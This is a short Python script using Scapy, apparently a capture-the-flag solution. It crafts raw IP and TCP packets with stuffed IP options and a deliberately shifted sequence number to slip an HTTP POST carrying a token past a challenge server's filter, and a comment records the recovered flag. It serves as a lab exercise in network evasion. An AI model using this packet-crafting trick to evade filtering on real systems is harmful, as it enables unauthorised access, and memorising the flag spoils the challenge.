#!/bin/python
# this should be run in kali
from scapy.all import *
#from pwn import *

import random

token = '<mytoken>'

# REMOTE_IP = "202.38.93.111"
# LOCAL_IP = "192.168.52.3"

# can you send ipv6 packet?

REMOTE_IP = "192.168.23.1"
LOCAL_IP = "192.168.24.4"

# REMOTE_IPV6 = ''

REMOTE_PORT = 18081
LOCAL_PORT = 21001 + random.randint(0, 5000)

needle = 'GET / HTTP'

load_layer('http')


raw_ip_pak = IP(dst=REMOTE_IP, src=LOCAL_IP) 
ip_pak = IP(dst=REMOTE_IP, src=LOCAL_IP, ihl=8, options=('\x00'+needle).ljust(12,'\x00'))


syn = raw_ip_pak / TCP(dport=REMOTE_PORT, sport=LOCAL_PORT, flags='S')
syn_ack = sr1(syn)
print(syn_ack)

# Ah？ just make seq -1, it will discard first letter???
# flag{r3s3rv3d_bYtes_a0d0b35dd2}
HTTP_msg = f' POST / HTTP/1.1\r\nHost: 123\r\nContent-Length: {len(token)}\r\n\r\n{token}\r\n\r\n'
req = raw_ip_pak / \
        TCP(dport=REMOTE_PORT, sport=syn_ack[TCP].dport, seq=syn_ack[TCP].ack-1, \
        ack=syn_ack[TCP].seq+1, flags="A") / HTTP_msg
#req.show()
#print(bytes(req))

resp = sr1(req)

#print(resp.summary())
